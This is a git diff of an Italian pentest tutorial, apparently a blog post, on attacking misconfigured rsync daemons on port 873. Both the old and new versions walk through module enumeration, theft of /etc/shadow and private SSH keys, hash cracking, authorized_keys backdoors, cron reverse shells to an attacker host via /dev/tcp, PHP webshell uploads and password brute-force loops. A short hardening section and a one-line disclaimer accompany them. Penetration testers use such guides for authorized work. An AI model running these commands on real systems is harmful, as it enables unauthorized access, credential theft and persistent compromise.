@@ -1,9 +1,7 @@
 ---
-title: 'Rsync Exploit Red Team: Enumerazione, Privilege Escalation e RCE su Porta 873'
+title: 'Rsync Port 873: Come Enumerare Moduli, Scaricare File Sensibili e Ottenere Shell'
 slug: rsync
-description: >-
-  Rsync è un potente strumento per sincronizzare e trasferire file da terminale.
-  Scopri come viene usato anche in attacchi interni per esfiltrazione dati.
+description: Rsync è un potente strumento per sincronizzare e trasferire file da terminale. Scopri come viene usato anche in attacchi interni per esfiltrazione dati.
 image: /rsync.webp
 draft: false
 date: 2026-01-25T00:00:00.000Z
@@ -17,258 +15,242 @@ tags:
 featured: true
 ---
 
-# Rsync Exploit Red Team: Enumerazione, Privilege Escalation e RCE su Porta 873
+Trovi la porta 873 aperta durante una scansione. In dieci minuti puoi avere hash delle password, chiavi SSH private e — se il modulo è writable — accesso diretto al sistema. Questa guida copre tutto: dalla prima connessione al demone rsync fino alla shell.
 
-**Se la porta 873 è aperta, non stai guardando un semplice servizio di backup.** Stai guardando una potenziale autostrada per l'esfiltrazione dati, il movimento laterale e, in configurazioni vulnerabili, l'esecuzione di codice remota (RCE). Questa guida red team avanzata mostra la catena di sfruttamento completa, da una semplice enumerazione alla compromissione totale.
+***
 
-## TL;DR Operativo (Flusso a Step)
+## Cos'è il Demone Rsyncd e Perché è Pericoloso
 
-1. **Scan Rapido**: `nmap -p 873 --open -T4 <RETE>` per trovare host con rsync esposto.
-2. **Enum Moduli**: `rsync <IP>::` per listare le condivisioni (moduli). Se fallisce, brute-force con nomi comuni (`backup`, `conf`, `deploy`).
-3. **Triage Silenzioso**: `rsync -av --list-only rsync://<IP>/<MODULO>/` per esplorare contenuti senza scaricare. Cerca `.env`, `.sql`, `.pem`, `.ssh/`.
-4. **Loot Mirato**: Scarica solo file ad alto valore con filtri `--include`/`--exclude`. Analizza SUBITO `.env` per segreti e prova ogni chiave SSH (`id_rsa`).
-5. **Verifica Scrittura**: Testa se un modulo è scrivibile con un file innocuo. Se lo è, valuta vettori di RCE: sovrascrittura di `authorized_keys`, script in `/etc/cron.d/`, o webshell in webroot.
-6. **Pivot/Post-Exploit**: Usa rsync via SSH (con credenziali/chiavi trovate) per muoverti lateralmente o esfiltrare dati da reti interne.
+Il demone `rsyncd` espone **moduli** — directory condivise configurate in `/etc/rsyncd.conf`. Ogni modulo può richiedere autenticazione oppure essere completamente aperto.
 
-## Introduzione: Perché Rsync è un Vettore Critico
+La misconfig più comune: nessun `auth users`. Chiunque si connette legge (o scrive) senza credenziali.
 
-Rsync è uno strumento di sincronizzazione file estremamente efficiente. Nella sicurezza offensiva, è rilevante perché spesso risiede su server di **backup**, **deploy** o **storage**, dove transitano asset critici: configurazioni applicative, dump di database, chiavi SSH, certificati SSL e codice sorgente.
+Esempio di configurazione vulnerabile:
 
-Trovare il demone `rsyncd` in ascolto sulla **porta TCP/873** è un segnale da investigare immediatamente. Una configurazione anche lievemente errata può esporre dati sensibili o, nei casi più gravi, fornire un percorso diretto per la compromissione del sistema.
+```ini
+[backup]
+    path = /var/backup
+    read only = yes
+    # nessun auth users = accesso anonimo
 
-**Nota Etica Fondamentale**: Le tecniche descritte sono per **lab autorizzati** (HTB, Proving Grounds, VM dedicate), **penetration test con scope scritto**, o sistemi di tua proprietà. L'abuso non autorizzato è illegale.
+[storage]
+    path = /home/fox
+    read only = no
+    # writable + anonimo = game over
+```
 
-## Fase 1: Ricognizione e Fingerprinting Aggressivo
+***
 
-Approccio chirurgico. Niente scan rumorosi e generalisti.
+## Come Enumerare i Moduli Rsync Esposti sulla Porta 873
+
+### Scan con nmap
+
+Usa [nmap](https://hackita.it/articoli/nmap) per confermare il servizio e listare i moduli esposti:
 
 ```bash
-# 1. Scoperta rapida nella subnet: chi ha la 873 aperta?
-nmap -p 873 --open -T4 10.10.10.0/24 -oG rsync_hosts.txt
-grep open rsync_hosts.txt | cut -d" " -f2
-
-# 2. Fingerprinting del target specifico. -sV è utile per la versione (CVE check).
-nmap -sV -sC -p 873 10.10.10.10
+nmap -sV -sC -p 873 <target>
 ```
 
-**Cosa Cercare Nell'Output**: `rsync` in ascolto, eventuale banner con numero di versione (es. `3.1.2`). Versioni obsolete possono avere vulnerabilità note (es. CVE-2017-16548).
+Output atteso:
 
-## Fase 2: Enumerazione dei Moduli (La Mappa del Tesoro)
+```
+873/tcp open  rsync   (protocol version 31)
+| rsync-list-modules:
+|   backup    Daily system backup
+|   www       Web document root
+```
 
-Il demone rsync organizza le directory condivise in "moduli". Enumerarli è il primo passo.
+### Lista moduli senza autenticazione
 
 ```bash
-# Prova ad elencare i moduli senza autenticazione.
-rsync 10.10.10.10::
+rsync rsync://<target>/
 ```
 
-**Output di esempio (golden ticket)**:
+Se risponde senza chiedere password: accesso anonimo confermato.
 
-```
-backup           Backup dei server
-conf             File di configurazione
-deploy           Directory di deploy applicativo
-```
-
-**Interpretazione**: Nomi come `backup`, `conf`, `deploy`, `www` sono indicatori fortissimi di dati sensibili.
-
-**Se la Lista è Negata (`@ERROR: access denied`)**:
-Non arrenderti. Il listing può essere disabilitato ma i moduli possono essere ancora accessibili. Fai un brute-force di nomi comuni.
+### Contenuto del modulo
 
 ```bash
-# Esempio con un semplice loop
-for module in backup conf data www storage sync deploy projects; do
-    echo "TESTING: $module";
-    rsync --list-only rsync://10.10.10.10/$module/ 2>/dev/null && echo "[+] Found: $module";
+rsync -av --list-only rsync://<target>/backup/
+```
+
+Filtra subito i file interessanti:
+
+```bash
+rsync -av --list-only rsync://<target>/backup/ | grep -iE "shadow|id_rsa|\.conf|\.key|secret"
+```
+
+***
+
+## Come Scaricare File Sensibili da un Modulo Rsync Anonimo
+
+### File singolo
+
+```bash
+rsync -av rsync://<target>/backup/etc/shadow /tmp/shadow
+rsync -av rsync://<target>/backup/root/.ssh/id_rsa /tmp/root_key
+```
+
+### Intero modulo
+
+```bash
+rsync -av rsync://<target>/backup/ /tmp/dump/
+```
+
+**Cosa fai con quello che hai:**
+
+* `shadow` → crack con [hashcat](https://hackita.it/articoli/hashcat): `hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt`
+* `id_rsa` → `chmod 600 /tmp/root_key && ssh -i /tmp/root_key root@<target>`
+* `rsyncd.secrets` → password per i moduli protetti
+
+***
+
+## Come Verificare se un Modulo Rsync è Writable
+
+```bash
+echo "test" > /tmp/test.txt
+rsync -av --dry-run /tmp/test.txt rsync://<target>/storage/
+```
+
+Se non ricevi `ERROR: module is read only` → puoi scrivere.
+
+***
+
+## Come Caricare una SSH Key su Rsync per Accesso Persistente
+
+Se il modulo mappa una home directory:
+
+```bash
+# 1. genera chiave
+ssh-keygen -f /tmp/backdoor -N ""
+
+# 2. crea .ssh in locale (cartella vuota)
+mkdir /tmp/.ssh
+
+# 3. carica la cartella sul target
+rsync -av /tmp/.ssh/ rsync://<target>/storage/.ssh/
+
+# 4. carica la chiave come authorized_keys
+rsync -av /tmp/backdoor.pub rsync://<target>/storage/.ssh/authorized_keys
+
+# 5. connettiti
+ssh -i /tmp/backdoor fox@<target>
+```
+
+> **Nota:** se la versione remota di rsync è vecchia, `--mkpath` non funziona. Devi caricare prima la cartella vuota, poi il file — nell'ordine esatto sopra.
+
+***
+
+## Reverse Shell via Crontab su Modulo Rsync Writable
+
+Se il modulo ha accesso a `/etc/cron.d/`:
+
+```bash
+echo "* * * * * root bash -i >& /dev/tcp/<tuo_ip>/9001 0>&1" > /tmp/evil_cron
+rsync -av /tmp/evil_cron rsync://<target>/backup/etc/cron.d/persistence
+```
+
+Listener: `nc -lvnp 9001`
+
+***
+
+## Webshell su Rsync con Modulo che Mappa il Web Root
+
+```bash
+echo '<?php system($_GET["c"]); ?>' > /tmp/cmd.php
+rsync -av /tmp/cmd.php rsync://<target>/www/cmd.php
+curl "http://<target>/cmd.php?c=id"
+```
+
+***
+
+## Brute Force su Modulo Rsync Protetto da Password
+
+```bash
+nmap -p 873 --script rsync-brute --script-args userdb=users.txt,passdb=passwords.txt <target>
+```
+
+Loop manuale con password comuni:
+
+```bash
+for pass in "" backup rsync admin password 123456; do
+  RSYNC_PASSWORD="$pass" rsync rsync://backup@<target>/private/ 2>/dev/null && echo "TROVATA: $pass" && break
 done
 ```
 
-## Fase 3: Triage con `--list-only` e Sfruttamento Chiavi SSH
+***
 
-Prima di scaricare terabyte di log, esplora in modo stealth.
+## Post-Exploitation: Cosa Fare Dopo la Shell
 
-```bash
-rsync -av --list-only rsync://10.10.10.10/backup/
-```
+Una volta dentro, usa [LinPEAS](https://hackita.it/articoli/linpeas) per enumerare il sistema e trovare vettori di privilege escalation.
 
-**Output di esempio**:
+***
 
-```
-drwxr-xr-x        4096 2023/10/26 .
--rw-r--r--    15482201 2023/10/25 application.tar.gz
--rw-------         600 2023/10/26 .env.production
--rw-r--r--       32768 2023/10/24 database.sql.gz
-drwx------        4096 2023/10/26 .ssh
--rw--------        1679 2023/10/26 .ssh/id_rsa
--rw-r--r--         394 2023/10/26 .ssh/id_rsa.pub
-```
+## Attack Chain Completa
 
-**Priorità Assoluta 1: La Chiave SSH (`id_rsa`)**. Questo è un jackpot.
+| Fase           | Comando                                                         |
+| -------------- | --------------------------------------------------------------- |
+| Scan           | `nmap -sV -sC -p 873 <target>`                                  |
+| Lista moduli   | `rsync rsync://<target>/`                                       |
+| Contenuto      | `rsync -av --list-only rsync://<target>/<mod>/`                 |
+| Download file  | `rsync -av rsync://<target>/<mod>/etc/shadow /tmp/`             |
+| Test write     | `rsync -av --dry-run test.txt rsync://<target>/<mod>/`          |
+| Upload SSH key | `rsync -av key.pub rsync://<target>/<mod>/.ssh/authorized_keys` |
+| SSH            | `ssh -i backdoor user@<target>`                                 |
 
-### Flusso Operativo per lo Sfruttamento di una Chiave SSH
+***
 
-**1. Recupero e Preparazione**:
+## Errori Comuni su Rsync e Come Risolverli
 
-```bash
-rsync -av rsync://10.10.10.10/backup/.ssh/id_rsa ./loot/target_rsa
-chmod 600 ./loot/target_rsa  # SSH rifiuta permessi troppo larghi
-```
+| Errore                   | Causa                           | Fix                                   |
+| ------------------------ | ------------------------------- | ------------------------------------- |
+| Connection refused       | rsyncd non attivo               | Cerca porta custom con `nmap -p-`     |
+| `@ERROR: auth failed`    | Password richiesta              | Brute force o password comuni         |
+| `@ERROR: Unknown module` | Nome sbagliato                  | Lista con `rsync rsync://<target>/`   |
+| `read only`              | Modulo non writable             | Prova altri moduli                    |
+| `change_dir failed`      | Directory non esiste sul target | Carica prima la cartella, poi il file |
 
-**2. Prova di Connessione Diretta**:
+***
 
-```bash
-# Prova utenti comuni. L'utente è spesso deducibile dal percorso del modulo o da altri file.
-ssh -i ./loot/target_rsa ubuntu@10.10.10.10
-ssh -i ./loot/target_rsa deploy@10.10.10.10
-ssh -i ./loot/target_rsa root@10.10.10.10  # Meno comune, ma prova sempre
-```
+## Come Proteggere Rsync dalla Porta 873
 
-**3. Se la Chiave è Protetta da Passphrase**:
+* `auth users` e `secrets file` su ogni modulo
+* `read only = yes` di default
+* `hosts allow` per limitare gli IP autorizzati
+* Log in `/var/log/rsyncd.log` con monitoraggio attivo
+* Soluzione definitiva: disabilita rsyncd, usa rsync over SSH (`rsync -e ssh`)
 
-```bash
-# Tenta di crackarla con john
-ssh2john ./loot/target_rsa > hash.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
+***
 
-**Spiegazione del Riutilizzo (Credential Spreading)**: In ambienti reali, le chiavi SSH vengono spesso riutilizzate su più server per automatizzare backup, deploy o accessi. Una chiave trovata su un server di backup può aprire le porte a server di produzione, jumpbox, o repository di codice.
-
-**Priorità Assoluta 2: File di Configurazione (`.env`, `*.config`, `*.yml`)**. Contengono quasi sempre segreti: password di database, chiavi API, token di servizi cloud.
+## Cheat Sheet Rsync Pentest
 
 ```bash
-# Scarica e analizza immediatamente
-rsync -av rsync://10.10.10.10/backup/.env.production ./loot/
-grep -i "pass\|key\|secret\|token\|url" ./loot/.env.production
+# enumera moduli
+rsync rsync://<target>/
+
+# lista contenuto modulo
+rsync -av --list-only rsync://<target>/<mod>/
+
+# scarica file singolo
+rsync -av rsync://<target>/<mod>/path/file /tmp/
+
+# scarica intero modulo
+rsync -av rsync://<target>/<mod>/ /tmp/dump/
+
+# test scrittura
+rsync -av --dry-run test.txt rsync://<target>/<mod>/
+
+# upload file
+rsync -av file rsync://<target>/<mod>/path/
+
+# con password
+RSYNC_PASSWORD=pass rsync rsync://user@<target>/<mod>/
 ```
 
-## Fase 4: Loot Mirato ed Exfiltration Stealth
+***
 
-Organizza il loot e minimizza il rumore di rete.
+Uso esclusivo in ambienti autorizzati.
 
-```bash
-# 1. Struttura ordinata per host e modulo
-mkdir -p loot/10.10.10.10/rsync_backup
+Se questo articolo ti è stato utile e vuoi supportare HackIta, puoi farlo qui: [hackita.it/supporto](https://hackita.it/supporto)
 
-# 2. Whitelist: scarica SOLO ciò che ha valore
-rsync -av \
-  --include="*/" \
-  --include=".env*" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json" \
-  --include="*.sql*" --include="*.dump" \
-  --include="id_rsa*" --include="*.pem" --include="*.key" --include="*.crt" \
-  --exclude="*" \
-  rsync://10.10.10.10/backup/ ./loot/10.10.10.10/rsync_backup/
-
-# 3. (Opzionale) Controllo del rumore e volume
-rsync -av --bwlimit=1000 --max-size=50M rsync://10.10.10.10/backup/large_logs/ ./loot/
-```
-
-## Fase 5: Abuso Avanzato e Percorso verso RCE
-
-Se un modulo è **scrivibile**, la superficie d'attacco esplode. L'enumerazione diventa exploit.
-
-### 1. Verifica Sicura della Scrittura
-
-```bash
-echo "test_$(date)" > /tmp/rsync_test.txt
-rsync -av /tmp/rsync_test.txt rsync://10.10.10.10/deploy_upload/
-# Se non da errore, il percorso è scrivibile.
-```
-
-### 2. Vettori di Exploit Concreti per RCE
-
-**RCE via `authorized_keys` Overwrite (Accesso Immediato)**:
-
-```bash
-# Genera una nuova coppia di chiavi
-ssh-keygen -f ./loot/attacker_key -N ""
-# Sovrascrivi o crea il file authorized_keys dell'utente remoto
-rsync -av ./loot/attacker_key.pub rsync://10.10.10.10/home_backup/user/.ssh/authorized_keys
-# Connettiti
-ssh -i ./loot/attacker_key user@10.10.10.10
-```
-
-**Impatto**: Shell immediata e persistente come quell'utente.
-
-**RCE via Sovrascrittura Cron/Systemd (Esecuzione come Root)**:
-
-```bash
-# Crea un payload per cron che esegue una reverse shell
-echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > /tmp/evil_cron
-# Caricalo se il modulo mappa /etc/cron.d/ o una directory genitore
-rsync -av /tmp/evil_cron rsync://10.10.10.10/system_backup/etc/cron.d/exploit
-```
-
-**Impatto**: Esecuzione di codice come root al prossimo minuto.
-
-**RCE via File di Deploy/Webroot (Webshell)**:
-
-```bash
-echo "<?php system(\$_GET['cmd']); ?>" > shell.php
-rsync -av shell.php rsync://10.10.10.10/web/uploads/
-# Esegui comandi via browser o curl
-curl "http://10.10.10.10/uploads/shell.php?cmd=id"
-```
-
-**Impatto**: Esecuzione di comandi remoti tramite il server web.
-
-## Errori Comuni che Vedo Negli Assessment Reali
-
-1. **Backup di File `.env` in Chiaro**: Il classico errore fatale. Espone password di database, chiavi API, secret di ogni genere.
-2. **`rsyncd` Esposto su Internet senza `auth users`**: Configurazione in `rsyncd.conf` senza autenticazione o con `hosts allow = 0.0.0.0/0`. Invito aperto al mondo.
-3. **Moduli con `read only = no` Innecessario**: Abilitare la scrittura per comodità, dimenticando il rischio di sovrascrittura di file critici.
-4. **Path del Modulo che Punta a Root (`/`) o `/etc`**: Errore gravissimo. Espone l'intero filesystem o le sue parti più sensibili.
-5. **Listing Pubblico (`list = true`) per Moduli Sensibili**: Fornisce gratuitamente la mappa dei dati più interessanti (`backup`, `conf`).
-
-## Hardening & Detection: La Visione del Blue Team
-
-Un red teamer efficace sa cosa cercherebbe un difensore.
-
-### Indicatori di Compromissione (IoC) Pratici
-
-**Log di `rsyncd`** (`/var/log/rsyncd.log`):
-
-```
-2024-01-15 03:14:15 [12345] recv FILES: .env.production, id_rsa
-2024-01-15 03:14:20 [12345] sent 45.6K bytes  total size 45.6K
-```
-
-Un trasferimento notturno di `.env` e `id_rsa` da un IP non autorizzato è un **IoC chiarissimo**.
-
-**Network Monitoring**:
-
-* Connessioni in entrata sulla **porta 873** da IP non appartenenti ai client di backup noti.
-* Picchi di traffico in uscita dalla 873 verso IP esterni (exfiltration).
-
-**File Integrity Monitoring (FIM)**:
-
-* Alterazioni in directory esportate come read-only.
-* Creazione di file sospetti (`authorized_keys`, nuovi script in `/etc/cron.d/`).
-
-### Checklist di Hardening Definitiva
-
-1. **Principio del Minimo Privilegio**: Se non necessario, **disabilita `rsyncd`**. Usa rsync over SSH.
-2. **Firewall e Segmentazione**: Limita l'accesso alla **873/TCP** solo agli IP dei client di backup.
-3. **Configurazione `rsyncd.conf` Forte**:
-   * `read only = yes` (se non serve scrivere).
-   * `list = false` (nascondi i moduli).
-   * `auth users = ...` e `secrets file = ...` (file con permessi 600).
-   * `hosts allow = <IP-client-backup>`.
-   * `uid = nobody`, `gid = nogroup`.
-4. **Isolamento e Cifratura**:
-   * I percorsi esportati devono essere **directory dedicate**, non root del FS.
-   * **Cifrare** i dati sensibili nei backup. Mai backup di chiavi SSH in chiaro.
-
-## CTA Finale: Passa dalla Teoria alla Pratica Muscolare
-
-Hai visto la catena: da una porta 873 a una chiave SSH, fino alla RCE. La differenza tra uno script kiddie e un red teamer sta nella capacità di eseguire questo flusso su scenari complessi e multi-step.
-
-**Mettiti alla prova con uno scenario reale** progettato per la nostra community:
-
-1. Trova il demone rsync esposto.
-2. Enumera e recupera una chiave SSH da un backup configurato male.
-3. Usala per pivotare su un segmento di rete interno.
-4. Sfrutta un modulo rsync scrivibile per ottenere RCE su un server critico.
-
-Questo lab avanzato fa parte dei nostri **percorsi Red Team Ops**. **[Unisciti a HackITA](https://hackita.it/iscrizione)** per accedere a questo e altri lab realistici, walkthrough video dettagliati e sessioni di mentorship per cementare le tue skill operative.
-
-Per le aziende: i nostri **Assessment Red Team su misura** partono proprio da esposizioni apparentemente "minori" come un rsync mal configurato per mappare l'intera catena di kill dell'infrastruttura. **[Richiedi una consulenza](https://hackita.it/servizi)**.
+Se vuoi fare sul serio — formazione 1:1, lab guidati o far testare la tua azienda — trovi tutto qui: [hackita.it/servizi](https://hackita.it/servizi)
